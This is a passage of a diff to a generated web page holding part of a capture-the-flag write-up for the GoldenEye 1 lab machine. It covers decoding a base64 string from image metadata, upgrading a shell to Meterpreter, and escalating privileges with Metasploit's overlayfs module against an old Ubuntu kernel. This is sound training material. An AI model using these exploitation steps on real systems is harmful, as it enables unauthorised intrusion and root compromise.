+<span class="normal"><a href="#__codelineno-24-24">24</a></span>
+<span class="normal"><a href="#__codelineno-24-25">25</a></span>
+<span class="normal"><a href="#__codelineno-24-26">26</a></span>
+<span class="normal"><a href="#__codelineno-24-27">27</a></span>
+<span class="normal"><a href="#__codelineno-24-28">28</a></span>
+<span class="normal"><a href="#__codelineno-24-29">29</a></span>
+<span class="normal"><a href="#__codelineno-24-30">30</a></span>
+<span class="normal"><a href="#__codelineno-24-31">31</a></span>
+<span class="normal"><a href="#__codelineno-24-32">32</a></span>
+<span class="normal"><a href="#__codelineno-24-33">33</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a>ExifTool Version Number         : 12.49
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a>File Name                       : for-007.jpg
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3"></a>Directory                       : Downloads
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4"></a>File Size                       : 15 kB
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5"></a>File Modification Date/Time     : 2023:01:19 12:37:35-05:00
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6"></a>File Access Date/Time           : 2023:01:19 12:37:35-05:00
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7"></a>File Inode Change Date/Time     : 2023:01:19 12:37:35-05:00
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8"></a>File Permissions                : -rw-r--r--
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9"></a>File Type                       : JPEG
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10"></a>File Type Extension             : jpg
+</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11"></a>MIME Type                       : image/jpeg
+</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12"></a>JFIF Version                    : 1.01
+</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13"></a>X Resolution                    : 300
+</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14"></a>Y Resolution                    : 300
+</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15"></a>Exif Byte Order                 : Big-endian (Motorola, MM)
+</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16"></a>Image Description               : eFdpbnRlcjE5OTV4IQ==
+</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17"></a>Make                            : GoldenEye
+</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18"></a>Resolution Unit                 : inches
+</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19"></a>Software                        : linux
+</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20"></a>Artist                          : For James
+</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21"></a>Y Cb Cr Positioning             : Centered
+</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22"></a>Exif Version                    : 0231
+</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23"></a>Components Configuration        : Y, Cb, Cr, -
+</span><span id="__span-24-24"><a id="__codelineno-24-24" name="__codelineno-24-24"></a>User Comment                    : For 007
+</span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25"></a>Flashpix Version                : 0100
+</span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26"></a>Image Width                     : 313
+</span><span id="__span-24-27"><a id="__codelineno-24-27" name="__codelineno-24-27"></a>Image Height                    : 212
+</span><span id="__span-24-28"><a id="__codelineno-24-28" name="__codelineno-24-28"></a>Encoding Process                : Baseline DCT, Huffman coding
+</span><span id="__span-24-29"><a id="__codelineno-24-29" name="__codelineno-24-29"></a>Bits Per Sample                 : 8
+</span><span id="__span-24-30"><a id="__codelineno-24-30" name="__codelineno-24-30"></a>Color Components                : 3
+</span><span id="__span-24-31"><a id="__codelineno-24-31" name="__codelineno-24-31"></a>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+</span><span id="__span-24-32"><a id="__codelineno-24-32" name="__codelineno-24-32"></a>Image Size                      : 313x212
+</span><span id="__span-24-33"><a id="__codelineno-24-33" name="__codelineno-24-33"></a>Megapixels                      : 0.066
+</span></code></pre></div></td></tr></table></div>
 <p>One field catches our attention: "Image Description". The value for that field is not very... descriptable: eFdpbnRlcjE5OTV4IQ==.</p>
 <p>The two equal signs at the end suggest that maybe base64 encode encryption is been employed. Let's use BurpSuite to decode it.</p>
 <p><img alt="Base64" src="../img/goldeneye1-5.png" /></p>
@@ -17896,8 +18207,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Now, we move our session to background with CTRL-z. </p>
 <p><strong>Module post/multi/manage/shell_to_meterpreter</strong></p>
 <p>Our goal now is going to be to move from a cmd/unix shell to a more powered meterpreter. This will allow us later on to execute a module in metasploit to escalate privileges.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>search shell_to_meterpreter
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>search shell_to_meterpreter
+</span></code></pre></div></td></tr></table></div>
 <p>We'll be using the module "post/multi/manage/shell_to_meterpreter".</p>
 <p><img alt="Shell to meterpreter" src="../img/goldeneye1-9.png" /></p>
 <p>We only need to set session, and LHOST. </p>
@@ -17908,11 +18219,11 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="escalating-privileges">Escalating privileges</h3>
 <p><strong>Module exploit/linux/local/overlayfs_priv_esc</strong></p>
 <p>We'll be using this module to escalate privileges. How have we got here? We run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>uname<span class="w"> </span>-a
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a>uname<span class="w"> </span>-a
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a>Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+</span></code></pre></div></td></tr></table></div>
 <p>Now, after googling "exploit escalate privileges ubuntu 3.13.0", we get:</p>
 <ul>
 <li><a href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a>.</li>
@@ -17926,14 +18237,20 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h4 id="last-getting-the-flag"><strong>Last</strong>, getting the flag</h4>
 <p>Now, we can cat the flag:</p>
 <p><img alt="Printing the flag" src="../img/goldeneye1-14.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>cat .flag.txt
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>Alec told me to place the codes here: 
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
-</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>568628e0d993b1973adc718237da6e93
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>
-</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>If you captured this make sure to go here.....
-</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>/006-final/xvf7-flag/
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span>
+<span class="normal"><a href="#__codelineno-28-2">2</a></span>
+<span class="normal"><a href="#__codelineno-28-3">3</a></span>
+<span class="normal"><a href="#__codelineno-28-4">4</a></span>
+<span class="normal"><a href="#__codelineno-28-5">5</a></span>
+<span class="normal"><a href="#__codelineno-28-6">6</a></span>
+<span class="normal"><a href="#__codelineno-28-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a>cat .flag.txt
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a>Alec told me to place the codes here: 
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4"></a>568628e0d993b1973adc718237da6e93
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6"></a>If you captured this make sure to go here.....
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7"></a>/006-final/xvf7-flag/
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Final screen" src="../img/goldeneye1-15.png" /></p>
 <p>Isn't is just fun???</p>
 
@@ -18011,7 +18328,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
